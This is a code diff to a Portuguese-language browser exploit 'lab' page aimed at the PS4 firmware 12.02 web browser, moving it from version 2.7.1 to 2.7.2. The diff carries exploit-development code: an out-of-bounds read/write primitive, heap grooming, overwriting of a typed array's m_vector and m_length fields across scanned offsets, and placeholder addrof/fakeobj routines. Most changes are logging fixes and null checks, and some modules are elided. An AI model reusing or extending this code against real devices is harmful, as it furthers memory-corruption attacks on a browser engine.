@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Laboratório de Exploração Avançada (v2.7.1 - Teste de Modularidade PS4)</title>
+    <title>Laboratório de Exploração Avançada (v2.7.2 - Correção Teste Modularidade PS4)</title>
     <style>
         body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 10px; font-size: 13px; }
         .container { margin-bottom: 20px; padding: 10px; background-color: #252526; border: 1px solid #333; border-radius: 5px; }
@@ -16,7 +16,7 @@
     </style>
 </head>
 <body>
-    <h1>Laboratório (v2.7.1 - Teste de Modularidade PS4 FW 12.02)</h1>
+    <h1>Laboratório (v2.7.2 - Correção Teste Modularidade PS4 FW 12.02)</h1>
     <p class="notes">Foco: Modularidade, Grooming agressivo, corrupção de m_vector/m_length, testes de R/W OOB, conceitos de addrof/fakeobj.</p>
     <p class="notes">ALTO RISCO DE CRASH! Anote o último GAP/teste bem-sucedido se o navegador fechar.</p>
 
@@ -108,11 +108,13 @@
             PAUSE_LAB: (ms = 100) => new Promise(r => setTimeout(r, ms)),
 
             testModule: () => {
-                UtilsLib.log("--- Testando Módulo UtilsLib ---", "test", "UtilsLib.test");
-                UtilsLib.log("Mensagem de log normal.", "info", "UtilsLib.test");
-                UtilsLib.log("Mensagem de erro.", "error", "UtilsLib.test");
-                UtilsLib.log(`toHexLab(12345): ${UtilsLib.toHexLab(12345)}`, "info", "UtilsLib.test");
-                UtilsLib.log("Teste UtilsLib concluído.", "good", "UtilsLib.test");
+                // CORREÇÃO: Usar a função 'log' global que já está bindada ao 'logOutput'
+                log("--- Testando Módulo UtilsLib ---", "test", "UtilsLib.test");
+                log("Mensagem de log normal.", "info", "UtilsLib.test");
+                log("Mensagem de erro.", "error", "UtilsLib.test");
+                // Usar this.toHexLab ou UtilsLib.toHexLab para funções dentro do mesmo "módulo"
+                log(`toHexLab(12345): ${UtilsLib.toHexLab(12345)}`, "info", "UtilsLib.test");
+                log("Teste UtilsLib concluído.", "good", "UtilsLib.test");
             }
         };
         // Alias globais para conveniência
@@ -161,15 +163,16 @@
             },
             testModule: () => {
                 log("--- Testando Módulo Int64Lib ---", "test", "Int64Lib.test");
-                const a = new Int64Lib.AdvancedInt64("0x100000000"); // 2^32
-                const b = new Int64Lib.AdvancedInt64(1,1); // 0x00000001_00000001
-                const c = Int64Lib.AdvancedInt64.fromNumber(-1);
+                const AdvancedInt64 = Int64Lib.AdvancedInt64; // Alias local para clareza
+                const a = new AdvancedInt64("0x100000000"); // 2^32
+                const b = new AdvancedInt64(1,1); // 0x00000001_00000001
+                const c = AdvancedInt64.fromNumber(-1);
                 log(`a = ${a.toString(true)}`, "info", "Int64Lib.test");
                 log(`b = ${b.toString(true)}`, "info", "Int64Lib.test");
                 log(`c = ${c.toString(true)} (isNegativeOne: ${c.isNegativeOne()})`, "info", "Int64Lib.test");
                 log(`a + b = ${a.add(b).toString(true)}`, "info", "Int64Lib.test");
                 log(`a - b = ${a.sub(b).toString(true)}`, "info", "Int64Lib.test");
-                log(`b.equals(new Int64(1,1)): ${b.equals(new Int64Lib.AdvancedInt64(1,1))}`, "info", "Int64Lib.test");
+                log(`b.equals(new AdvancedInt64(1,1)): ${b.equals(new AdvancedInt64(1,1))}`, "info", "Int64Lib.test");
                 log(`b.isZero(): ${b.isZero()}`, "info", "Int64Lib.test");
                 log("Teste Int64Lib concluído.", "good", "Int64Lib.test");
             }
@@ -212,8 +215,7 @@
 
                 CoreExploitLib.oob_array_buffer_real = null; CoreExploitLib.oob_dataview_real = null;
                 try {
-                    // Alocar com um pouco mais de espaço para garantir que baseOffsetInBuffer + initialBufferSize + OOB_ALLOCATION_SIZE caibam
-                    const totalSizeNeeded = CoreExploitLib.baseOffsetInBuffer + oobWriteOffsetFromLogicalStart + CoreExploitLib.OOB_ALLOCATION_SIZE + 64;
+                    const totalSizeNeeded = CoreExploitLib.baseOffsetInBuffer + oobWriteOffsetFromLogicalStart + CoreExploitLib.OOB_ALLOCATION_SIZE + 64; // Margem de segurança
                     CoreExploitLib.oob_array_buffer_real = new ArrayBuffer(totalSizeNeeded);
                     CoreExploitLib.oob_dataview_real = new DataView(CoreExploitLib.oob_array_buffer_real);
                     log(`   oob_array_buffer_real alocado com ${CoreExploitLib.oob_dataview_real.buffer.byteLength} bytes.`, "info", FNAME);
@@ -277,7 +279,7 @@
                     log("Falha ao ativar primitiva OOB. Teste abortado.", "error", "CoreExploitLib.test");
                     return;
                 }
-                const test_rel_offset = CoreExploitLib.initialBufferSize + 16;
+                const test_rel_offset = CoreExploitLib.initialBufferSize + 16; // Exemplo de offset dentro da área "OOB lógica"
                 const test_val32 = 0x12345678;
                 const test_val64 = new Int64Lib.AdvancedInt64("0xAABBCCDDEEFF0011");
 
@@ -296,7 +298,7 @@
                 if (read_val64 instanceof Int64Lib.AdvancedInt64 && read_val64.equals(test_val64)) {
                     log(`SUCESSO: Lido ${read_val64.toString(true)} corretamente. Primitiva R/W 64bit OOB relativa parece funcional.`, "good", "CoreExploitLib.test");
                 } else {
-                    log(`FALHA: Lido ${read_val64 ? read_val64.toString(true) : "null"}, esperado ${test_val64.toString(true)}.`, "error", "CoreExploitLib.test");
+                    log(`FALHA: Lido ${read_val64 ? read_val64.toString(true) : "null/erro"}, esperado ${test_val64.toString(true)}.`, "error", "CoreExploitLib.test");
                 }
                 log("Teste CoreExploitLib concluído.", "good", "CoreExploitLib.test");
             }
@@ -305,7 +307,7 @@
         // ===================================================================================
         // MÓDULO: HeapGroomerLib
         // ===================================================================================
-        const HeapGroomerLib = {
+        const HeapGroomerLib = { /* ... implementação como na v2.7.1 ... */
             victim_object: null,
             victim_object_type: 'TypedArray',
             spray_array_temp: [],
@@ -344,12 +346,12 @@
                 log(`Vítima (${this.victim_object_type}, ${this.victim_object.length} elems, ${this.victim_object.byteLength}b) alocada. Padrão: 0xBB00xxxx`, 'good', FNAME_PREP_VICTIM);
                 return true;
             }
-        };
+         };
 
         // ===================================================================================
         // MÓDULO: VictimCorruptorLib
         // ===================================================================================
-        const VictimCorruptorLib = {
+        const VictimCorruptorLib = { /* ... implementação como na v2.7.1 ... */
             CURRENT_TEST_GAP: 0,
             last_successful_gap: null,
             FNAME_BASE: "VictimCorruptorLib",
@@ -394,8 +396,8 @@
                 } else { log(`       FALHA: m_vector NÃO foi sobrescrito. Lido: ${written_mvector ? written_mvector.toString(true) : "null/erro"}`, "warn", FNAME_TRY_FIELDS); }
                 try {
                     log(`       Tentando acessar victim_object[0] (m_vector=${crash_test_mvector_addr.toString(true)})...`, "critical", FNAME_TRY_FIELDS);
-                    HeapGroomerLib.victim_object[0];
-                    log(`       ACESSO A victim_object[0] NÃO CRASHOU.`, "warn", FNAME_TRY_FIELDS);
+                    let val = HeapGroomerLib.victim_object[0]; // Acesso que pode crashar
+                    log(`       ACESSO A victim_object[0] NÃO CRASHOU. Valor lido: ${toHexS1(val)}`, "warn", FNAME_TRY_FIELDS);
                 } catch (e) {
                     log(`       CRASH/ERRO ESPERADO (m_vector): ${e.message}`, "good", FNAME_TRY_FIELDS); result.crashed_or_error = true; result.mvector_corrupted = true; this.last_successful_gap = current_gap_to_test;
                     log(`GAP ${current_gap_to_test} MARCADO COMO SUCESSO (CRASH M_VECTOR)!`, "vuln", FNAME_TRY_FIELDS); return result;
@@ -413,7 +415,7 @@
                     log(`     ↳ m_length target FORA DO ALCANCE.`, "warn", FNAME_TRY_FIELDS);
                 } else {
                     let original_mlength = CoreExploitLib.oob_read_relative(m_length_field_rel_offset_from_oob_base, 4);
-                    if (typeof original_mlength === 'number' && original_mlength === HeapGroomerLib.victim_object.length) {
+                    if (typeof original_mlength === 'number' && HeapGroomerLib.victim_object && original_mlength === HeapGroomerLib.victim_object.length) { // Checar se victim_object existe
                         result.mlength_read = toHexS1(original_mlength); log(`     ↳ GAP ${current_gap_to_test}: ACHADO m_length ORIGINAL: ${result.mlength_read}`, "leak", FNAME_TRY_FIELDS);
                     } else { log(`     ↳ GAP ${current_gap_to_test}: Leitura do m_length original retornou ${toHexS1(original_mlength)}.`, "info", FNAME_TRY_FIELDS); }
                     const large_mlength_val = 0x7FFFFFFF;
@@ -423,8 +425,8 @@
                     if (typeof written_mlength === 'number' && written_mlength === large_mlength_val) {
                         log(`       CONFIRMADO: m_length sobrescrito para ${toHexS1(written_mlength)}`, "good", FNAME_TRY_FIELDS); result.mlength_corrupted = true;
                     } else { log(`       FALHA: m_length NÃO foi sobrescrito. Lido: ${toHexS1(written_mlength)}`, "warn", FNAME_TRY_FIELDS); }
-                    if (result.mlength_corrupted) {
-                        try { const far_index = HeapGroomerLib.victim_object.length + 100000; log(`       Tentando acessar victim_object[${far_index}] (m_length=${toHexS1(large_mlength_val)})...`, "critical", FNAME_TRY_FIELDS); HeapGroomerLib.victim_object[far_index]; log(`       ACESSO A victim_object[${far_index}] NÃO CRASHOU.`, "warn", FNAME_TRY_FIELDS);
+                    if (result.mlength_corrupted && HeapGroomerLib.victim_object) { // Checar se victim_object existe
+                        try { const far_index = HeapGroomerLib.victim_object.length + 100000; log(`       Tentando acessar victim_object[${far_index}] (m_length=${toHexS1(large_mlength_val)})...`, "critical", FNAME_TRY_FIELDS); let val = HeapGroomerLib.victim_object[far_index]; log(`       ACESSO A victim_object[${far_index}] NÃO CRASHOU. Valor lido: ${toHexS1(val)}`, "warn", FNAME_TRY_FIELDS);
                         } catch (e) { log(`       CRASH/ERRO ESPERADO (m_length): ${e.message}`, "good", FNAME_TRY_FIELDS); result.crashed_or_error = true; this.last_successful_gap = current_gap_to_test; log(`GAP ${current_gap_to_test} MARCADO COMO SUCESSO (CRASH M_LENGTH)!`, "vuln", FNAME_TRY_FIELDS); }
                     }
                     if (typeof original_mlength === 'number' && result.mlength_corrupted) {
@@ -461,12 +463,13 @@
             }
         };
 
+
         // ===================================================================================
         // MÓDULO: PostExploitLib_Conceptual
         // ===================================================================================
-        const PostExploitLib_Conceptual = {
+        const PostExploitLib_Conceptual = { /* ... implementação como na v2.7.1 ... */
             arr_leaker: null,
-            arr_marker: { p0:0x41414141, p1:0x42424242, p2:0x43434343, p3:0x44444444 },
+            arr_marker: { p0:0x41414141, p1:0x42424242, p2:0x43434343, p3:0x44444444 }, // Objeto JS simples
             addr_arr_marker_approx: null,
             FNAME_BASE: "PostExploitLib_Conceptual",
 
@@ -476,9 +479,10 @@
                 if (isNaN(gap_to_use) && VictimCorruptorLib.last_successful_gap !== null) { gap_to_use = VictimCorruptorLib.last_successful_gap; document.getElementById('addrofGap').value = gap_to_use; log(`Usando último GAP de sucesso: ${gap_to_use}`, "info", this.FNAME_BASE); }
                 else if (isNaN(gap_to_use)) { log("ERRO: GAP para addrof inválido.", "error", this.FNAME_BASE); return; }
                 if (!CoreExploitLib.oob_dataview_real) { log("ERRO: Primitiva OOB não ativa.", "error", this.FNAME_BASE); return; }
-                this.arr_leaker = new Uint32Array(16);
+                this.arr_leaker = new Uint32Array(16); // Usado para *tentar* ler/escrever
+                // this.arr_marker já é um objeto JS.
                 log("`arr_leaker` e `arr_marker` (objeto JS) criados.", "info", this.FNAME_BASE);
-                log("Este é um teste altamente conceitual.", "warn", this.FNAME_BASE);
+                log("Este é um teste altamente conceitual e provavelmente não funcionará como um addrof/fakeobj real sem primitivas mais fortes.", "warn", this.FNAME_BASE);
                 log(`--- ${this.FNAME_BASE}.setup Concluído ---`, 'test', this.FNAME_BASE);
             },
             addrof_conceptual: function(obj_to_leak) { log("addrof_conceptual: Placeholder.", "warn", this.FNAME_BASE); if (obj_to_leak === this.arr_marker && this.addr_arr_marker_approx) return this.addr_arr_marker_approx; return new Int64Lib.AdvancedInt64("0xDEADBEEFDEADBEEF"); },
@@ -486,7 +490,7 @@
             test_addrof_conceptual: async function() {
                 log(`--- Iniciando ${this.FNAME_BASE}.test_addrof ---`, 'test', this.FNAME_BASE);
                 const obj_name_to_leak = document.getElementById('objNameToLeak').value; let obj_instance;
-                try { obj_instance = eval(obj_name_to_leak); } catch (e) { log(`ERRO: Objeto global '${obj_name_to_leak}' não encontrado.`, "error", this.FNAME_BASE); return; }
+                try { obj_instance = eval(obj_name_to_leak); } catch (e) { log(`ERRO: Objeto global '${obj_name_to_leak}' não encontrado. Ex: 'PostExploitLib_Conceptual.arr_marker'`, "error", this.FNAME_BASE); return; }
                 if (typeof obj_instance === 'undefined') { log(`ERRO: Objeto '${obj_name_to_leak}' é undefined.`, "error", this.FNAME_BASE); return; }
                 log(`Tentando obter endereço de '${obj_name_to_leak}'`, "info", this.FNAME_BASE);
                 const addr = this.addrof_conceptual(obj_instance); log(`Endereço (conceitual) de '${obj_name_to_leak}': ${addr.toString(true)}`, "leak", this.FNAME_BASE);
@@ -502,7 +506,6 @@
                 log(`--- ${this.FNAME_BASE}.test_fakeobj Concluído ---`, 'test', this.FNAME_BASE);
             }
         };
-
 
         // ===================================================================================
         // MÓDULO: App (Lógica de UI e Fluxos Principais)
@@ -559,7 +562,7 @@
         // ===================================================================================
         document.addEventListener('DOMContentLoaded', () => {
             CoreExploitLib.updateGlobalConfigs(); // Carrega configs iniciais dos inputs
-            log("Laboratório (v2.7.1 - Teste de Modularidade) pronto para testes.", "good", "App.Init");
+            log("Laboratório (v2.7.2 - Correção Teste Modularidade) pronto para testes.", "good", "App.Init");
 
             const testButtonsContainer = document.createElement('div');
             testButtonsContainer.className = 'container';
@@ -570,10 +573,10 @@
                 <button onclick="CoreExploitLib.testModule()">Testar Módulo CoreExploitLib (OOB)</button>
                 <p class="notes">Módulos HeapGroomerLib e VictimCorruptorLib são testados através dos fluxos principais (Passos 1-2). PostExploitLib é conceitual.</p>
             `;
-            // Insere o container de botões de teste após o logOutput e antes do Passo 0
             const logOutputDiv = document.getElementById('logOutput');
             logOutputDiv.parentNode.insertBefore(testButtonsContainer, logOutputDiv.nextSibling);
 
+            // Preencher campo GAP para addrof se um GAP de sucesso já foi encontrado
             if (document.getElementById('addrofGap') && VictimCorruptorLib.last_successful_gap !== null) {
                  document.getElementById('addrofGap').value = VictimCorruptorLib.last_successful_gap;
             }
